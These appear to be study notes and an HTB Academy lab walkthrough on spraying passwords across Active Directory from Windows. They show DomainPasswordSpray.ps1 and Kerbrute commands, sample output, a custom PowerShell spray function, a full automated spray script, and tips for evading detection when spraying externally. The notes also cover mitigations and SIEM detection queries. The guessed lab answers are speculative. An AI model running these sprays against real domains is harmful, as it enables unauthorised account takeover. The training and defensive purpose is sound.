# Internal Password Spraying - from Windows

## 📋 Overview

When operating from a domain-joined Windows host, password spraying becomes significantly more powerful and automated. The **DomainPasswordSpray.ps1** tool leverages domain context to automatically generate user lists, query password policies, and intelligently avoid account lockouts while maximizing attack efficiency.

## 🎯 Attack Scenarios

### 🏢 **Common Windows Attack Contexts**
- **Initial Foothold**: Compromised domain-joined workstation
- **Managed Devices**: Client-provided Windows testing environment
- **Physical Access**: On-site penetration testing from Windows VM
- **Privilege Escalation**: Authenticated user seeking higher privileges
- **Lateral Movement**: Expanding access within domain environment

### ⚡ **Key Advantages from Windows**
- **Domain Integration**: Automatic user enumeration from Active Directory
- **Policy Awareness**: Intelligent lockout threshold detection
- **Fine-Grained Control**: Support for Fine-Grained Password Policies
- **Smart Filtering**: Automatic exclusion of near-lockout accounts
- **Native Tools**: PowerShell-based execution without external dependencies

---

## 🔧 DomainPasswordSpray.ps1

### 📝 **Tool Overview**
- **Author**: dafthack (Beau Bullock)
- **Language**: PowerShell
- **Context**: Domain-joined Windows hosts
- **Intelligence**: Automatic policy detection and user filtering
- **Safety**: Built-in lockout prevention mechanisms

### ⚙️ **Key Features**
```powershell
# Automatic capabilities when domain-joined:
- User list generation from Active Directory
- Domain password policy enumeration
- Fine-Grained Password Policy detection
- Disabled account filtering
- Near-lockout account exclusion
- Intelligent timing between spray attempts
```

### 🚀 **Basic Usage (Domain-Joined)**
```powershell
# Import the module
Import-Module .\DomainPasswordSpray.ps1

# Basic password spray with single password
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### 📊 **Example Execution Output**
```powershell
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

---

## 🔧 Advanced DomainPasswordSpray Usage

### 📋 **Command Parameters**
```powershell
# Full parameter list
Invoke-DomainPasswordSpray
    -Password <string>          # Single password to test
    -PasswordList <string>      # File containing multiple passwords
    -UserList <string>          # Custom user list (optional)
    -OutFile <string>           # Output file for results
    -Domain <string>            # Target domain (auto-detected if domain-joined)
    -Force                      # Skip confirmation prompts
    -UsernameAsPassword         # Test username as password
    -ErrorAction SilentlyContinue  # Suppress error output
```

### 🎯 **Multiple Password Spraying**
```powershell
# Create password list file
"Welcome1" | Out-File -FilePath passwords.txt -Encoding ASCII
"Password123" | Out-File -FilePath passwords.txt -Append -Encoding ASCII
"Winter2022" | Out-File -FilePath passwords.txt -Append -Encoding ASCII
"Spring2024" | Out-File -FilePath passwords.txt -Append -Encoding ASCII

# Spray multiple passwords
Invoke-DomainPasswordSpray -PasswordList passwords.txt -OutFile spray_results -Force
```

### 🔍 **Custom User List (Non-Domain Context)**
```powershell
# For non-domain-joined scenarios
$users = @("user1", "user2", "user3", "admin", "service")
$users | Out-File -FilePath custom_users.txt -Encoding ASCII

Invoke-DomainPasswordSpray -UserList custom_users.txt -Password Welcome1 -Domain inlanefreight.local -OutFile results
```

### 🛡️ **Safety Features**
```powershell
# Tool automatically:
- Detects lockout thresholds (finds smallest threshold across domain)
- Excludes disabled accounts from spray list
- Removes users within 1 attempt of lockout
- Implements wait times between spray attempts
- Respects Fine-Grained Password Policies
- Provides confirmation prompts for large user lists
```

---

## 🎯 HTB Academy Lab Walkthrough

### 📝 Lab Question
*"Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer."*

### 🚀 Step-by-Step Solution

#### 1️⃣ **Connect to Target Windows Host**
```bash
# RDP to target machine
xfreerdp /v:10.129.99.227 /u:htb-student /p:Academy_student_AD!
```

#### 2️⃣ **Access PowerShell as Administrator**
```powershell
# Right-click PowerShell -> Run as Administrator
# Navigate to tools directory
cd C:\Tools
```

#### 3️⃣ **Import DomainPasswordSpray Module**
```powershell
# Import the PowerShell module
Import-Module .\DomainPasswordSpray.ps1

# Verify module is loaded
Get-Command Invoke-DomainPasswordSpray
```

#### 4️⃣ **Execute Password Spray with Winter2022**
```powershell
# Spray Winter2022 password against all domain users
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile winter_spray_results -ErrorAction SilentlyContinue
```

#### 5️⃣ **Expected Output Analysis**
```powershell
# Tool will show:
[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are XXXX total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing XXXX users gathered from the current user's domain

# When prompted:
Are you sure you want to perform a password spray against XXXX accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

# Success output will show:
[*] SUCCESS! User:[TARGET_USER] Password:Winter2022
```

#### 6️⃣ **Check Results File**
```powershell
# View successful logins
Get-Content winter_spray_results
type winter_spray_results

# Expected format:
# [TARGET_USER]:Winter2022
```

#### 7️⃣ **Alternative: Kerbrute from Windows**
```cmd
# If DomainPasswordSpray is unavailable, use Kerbrute
cd C:\Tools
kerbrute.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 users.txt Winter2022
```

### ✅ **Expected Answer Format**
Based on typical HTB lab patterns, the answer should be a username like:
- `jhall`
- `mholliday` 
- `dgraves`
- `[specific_username]`

*(Actual answer will be visible in the spray results output)*

---

## 🛠️ Alternative Windows Tools

### 🎫 **Kerbrute on Windows**
```cmd
# Download and use Kerbrute Windows binary
kerbrute.exe userenum -d inlanefreight.local --dc 172.16.5.5 users.txt
kerbrute.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 users.txt Winter2022
```

### 🔨 **Native PowerShell Spraying**
```powershell
# Simple PowerShell spray function
function Test-DomainCredential {
    param($Username, $Password, $Domain)
    
    $cred = New-Object System.Management.Automation.PSCredential("$Domain\$Username", (ConvertTo-SecureString $Password -AsPlainText -Force))
    
    try {
        $session = New-PSSession -Credential $cred -ErrorAction Stop
        Remove-PSSession $session
        return $true
    }
    catch {
        return $false
    }
}

# Usage
$users = @("user1", "user2", "user3")
foreach ($user in $users) {
    if (Test-DomainCredential -Username $user -Password "Winter2022" -Domain "inlanefreight") {
        Write-Host "[SUCCESS] $user:Winter2022" -ForegroundColor Green
    }
}
```

---

## 🛡️ Mitigations

### 🔐 **Multi-Factor Authentication (MFA)**
```powershell
# Implementation considerations:
- Push notifications to mobile devices
- Rotating One Time Passwords (OTP) - Google Authenticator, RSA tokens
- SMS text message confirmations
- Hardware security keys (FIDO2, U2F)
- Biometric authentication
```

**⚠️ Important Notes:**
- Some MFA implementations still disclose valid username/password combinations
- Credentials may be reusable against other services without MFA
- Implement MFA on **all** external portals and critical applications

### 🚪 **Access Restrictions**
```powershell
# Principle of least privilege:
- Restrict application access to users who require it
- Implement role-based access controls (RBAC)
- Regular access reviews and cleanup
- Disable unnecessary service accounts
- Limit domain user application access
```

### 🎯 **Reducing Impact of Successful Exploitation**
```powershell
# Defensive strategies:
- Separate privileged accounts for administrative activities
- Application-specific permission levels
- Network segmentation (isolate compromised subnets)
- Just-in-Time (JIT) administrative access
- Privileged Access Management (PAM) solutions
```

### 🔑 **Password Hygiene**
```powershell
# Password policies and education:
- Encourage passphrases over complex passwords
- Implement password filters for:
  * Common dictionary words
  * Months and seasons (Spring, Winter, etc.)
  * Company name variations
  * Sequential patterns (123, abc)
- Regular password security training
- Password manager adoption
```

### ⚖️ **Lockout Policy Considerations**
```powershell
# Balanced approach:
- Avoid overly restrictive lockout policies (DoS risk)
- Consider account lockout duration vs. manual unlock
- Implement progressive delays instead of hard lockouts
- Monitor for mass lockout events
- Exception handling for service accounts
```

---

## 🔍 Detection

### 📊 **Key Event IDs to Monitor**

#### 🚨 **Event ID 4625: Account Failed to Log On**
```powershell
# Indicators of password spraying:
- Multiple 4625 events in short time period
- Same source IP across multiple usernames
- Failed attempts with valid usernames
- Patterns in timing (automated attempts)
```

#### 🎫 **Event ID 4771: Kerberos Pre-authentication Failed**
```powershell
# LDAP password spraying detection:
- Requires Kerberos logging enabled
- Multiple pre-auth failures from single source
- Indicates more sophisticated attackers avoiding SMB
```

### 📈 **Detection Rules and Queries**

#### 🔍 **SIEM Query Examples**
```sql
-- PowerShell/Splunk Query for Password Spray Detection
index=security EventCode=4625 
| stats count by src_ip, user 
| where count > 3 
| stats count by src_ip 
| where count > 10

-- KQL Query for Azure Sentinel
SecurityEvent
| where EventID == 4625
| summarize FailedAttempts = count() by SourceIP = IpAddress, TimeGenerated
| where FailedAttempts > 5
```

#### 🚨 **Alert Thresholds**
```powershell
# Recommended alerting criteria:
- 5+ failed logins from single IP within 5 minutes
- 10+ unique usernames targeted from single source
- Failed login attempts outside business hours
- Geographic anomalies (impossible travel)
- Service account lockouts (often targeted)
```

### 🕵️ **Behavioral Analytics**
```powershell
# Advanced detection methods:
- Baseline normal authentication patterns
- Detect deviations in login timing
- Identify unusual source locations
- Monitor for distributed spraying (multiple IPs)
- Correlate with other attack indicators
```

---

## 🌐 External Password Spraying Targets

### 📋 **Common External Targets**
```powershell
# Microsoft 365 and Exchange:
- Microsoft 365 (Office 365)
- Outlook Web Exchange (OWE)
- Exchange Web Access (EWA)
- Skype for Business
- Microsoft Teams
- OneDrive for Business

# Remote Access Solutions:
- Microsoft Remote Desktop Services (RDS) Portals
- Citrix portals with AD authentication
- VDI implementations (VMware Horizon, etc.)
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet)

# Collaboration and Custom Apps:
- SharePoint Online
- Custom web applications using AD authentication
- Intranet portals
- Business applications with SAML/SSO
```

### 🎯 **External Spraying Considerations**
```powershell
# Attack adaptations for external targets:
- Slower timing to avoid detection
- Distributed source IPs (residential proxies)
- User-Agent rotation
- Session management
- CAPTCHA bypass techniques
- Account enumeration before spraying
```

---

## 📝 Complete Lab Solution Script

### 🚀 **Automated Lab Solution**
```powershell
# Complete PowerShell script for HTB Lab
# Save as: winter_spray_lab.ps1

Write-Host "[*] HTB Academy Lab: Finding Winter2022 Password" -ForegroundColor Cyan

# Import DomainPasswordSpray module
try {
    Import-Module .\DomainPasswordSpray.ps1 -ErrorAction Stop
    Write-Host "[+] DomainPasswordSpray module imported successfully" -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to import DomainPasswordSpray module" -ForegroundColor Red
    exit 1
}

# Execute password spray
Write-Host "[*] Starting password spray with Winter2022..." -ForegroundColor Yellow

try {
    Invoke-DomainPasswordSpray -Password Winter2022 -OutFile winter_results -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Password spray completed" -ForegroundColor Green
}
catch {
    Write-Host "[-] Password spray failed: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# Check results
if (Test-Path winter_results) {
    Write-Host "[*] Checking results..." -ForegroundColor Yellow
    $results = Get-Content winter_results
    
    if ($results) {
        Write-Host "[+] SUCCESS! Found credentials:" -ForegroundColor Green
        $results | ForEach-Object {
            Write-Host "    $_" -ForegroundColor Yellow
            $username = $_.Split(':')[0]
            Write-Host "[*] Lab Answer: $username" -ForegroundColor Cyan
        }
    }
    else {
        Write-Host "[-] No successful logins found" -ForegroundColor Red
    }
}
else {
    Write-Host "[-] Results file not created" -ForegroundColor Red
}
```

---

## ⚡ Quick Reference Commands

### 🔧 **Essential Commands**
```powershell
# Import and basic spray
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile results -Force

# Multiple passwords
Invoke-DomainPasswordSpray -PasswordList passwords.txt -OutFile results -Force

# Check results
Get-Content results
type results

# Kerbrute alternative
kerbrute.exe passwordspray -d domain.local --dc DC_IP users.txt PASSWORD
```

### 🔍 **Verification Commands**
```powershell
# Verify discovered credentials
net use \\DC_IP\IPC$ /user:DOMAIN\USERNAME PASSWORD

# Test RDP access
mstsc /v:TARGET_IP /u:USERNAME /p:PASSWORD

# PowerShell credential test
$cred = Get-Credential
Test-WSMan -ComputerName TARGET -Credential $cred
```

---

## 🔑 Key Takeaways

### ✅ **Windows Spraying Advantages**
- **Automated Intelligence**: Domain-joined context provides automatic user enumeration and policy detection
- **Built-in Safety**: Intelligent lockout prevention and account filtering
- **Native Integration**: PowerShell-based tools leverage existing Windows infrastructure
- **Policy Awareness**: Respects Fine-Grained Password Policies and lockout thresholds

### ⚠️ **Critical Considerations**
- **Confirmation Prompts**: Tool requires confirmation for large user lists (security feature)
- **Timing Intelligence**: Automatic wait periods based on domain policy
- **Scope Awareness**: Tool operates within current user's domain context
- **Output Management**: Results are saved to specified files for later analysis

### 🎯 **Post-Success Actions**
1. **Immediate Validation**: Test discovered credentials against multiple services
2. **Privilege Assessment**: Determine access levels and group memberships
3. **Lateral Movement**: Use credentials for further domain enumeration
4. **Documentation**: Log all findings for comprehensive reporting

---

*Windows-based password spraying combines the power of domain integration with intelligent automation - making it one of the most effective credential discovery methods in Active Directory environments.* 